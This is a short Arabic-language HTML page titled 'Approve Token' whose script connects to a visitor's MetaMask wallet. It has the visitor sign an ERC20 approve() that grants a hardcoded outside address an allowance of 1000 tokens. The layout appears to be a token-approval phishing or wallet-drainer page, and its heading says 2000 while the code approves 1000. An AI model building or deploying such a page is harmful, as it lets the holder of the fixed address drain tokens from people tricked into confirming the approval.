<!DOCTYPE html>
<html lang="ar">
  <head>
    <meta charset="UTF-8" />
    <title>Approve Token</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  </head>
  <body>
    <h2>Approve 2000 Token</h2>
    <input type="text" id="tokenAddress" placeholder="عنوان التوكن ERC20" />
    <button id="approveBtn">اعمل Approve 1000</button>
    <p id="result"></p>

    <script>
      const approveBtn = document.getElementById("approveBtn");
      const result = document.getElementById("result");

      approveBtn.addEventListener("click", async () => {
        const tokenAddress = document.getElementById("tokenAddress").value.trim();
        const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // محفظتك

        if (!window.ethereum) {
          result.textContent = "متصفحك لا يدعم MetaMask";
          return;
        }

        const provider = new ethers.BrowserProvider(window.ethereum);
        let accounts = await provider.send("eth_accounts", []);

        if (accounts.length === 0) {
          try {
            accounts = await provider.send("eth_requestAccounts", []);
          } catch (err) {
            result.textContent = "لم يتم السماح بالوصول للمحفظة.";
            return;
          }
        }

        const signer = await provider.getSigner();
        const userAddress = await signer.getAddress();

        const abi = [
          "function approve(address spender, uint256 amount) public returns (bool)",
          "function decimals() view returns (uint8)",
        ];

        try {
          const contract = new ethers.Contract(tokenAddress, abi, signer);
          const decimals = await contract.decimals();
          const amount = ethers.parseUnits("1000", decimals);
          const tx = await contract.approve(spenderAddress, amount);
          result.textContent = "جاري إرسال المعاملة، انتظر التأكيد...";
          await tx.wait();
          result.textContent = "تمت الموافقة بنجاح!";
        } catch (err) {
          console.error(err);
          result.textContent = "حدث خطأ: " + (err.shortMessage || err.message);
        }
      });
    </script>
  </body>
</html>
